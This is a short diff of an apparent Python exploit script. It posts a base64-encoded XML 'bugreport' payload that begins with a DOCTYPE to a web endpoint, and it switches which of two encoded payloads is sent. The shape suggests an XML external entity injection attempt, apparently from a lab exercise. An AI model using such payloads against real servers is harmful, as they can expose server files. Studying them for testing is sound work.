@@ -29,8 +29,9 @@ b64_2 = "PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVB
 		</bugreport>
 '''        
 
+
 data = {
-       'data': b64_2
+       'data': b64_1
         }
 
 r = requests.post(url, data=data)
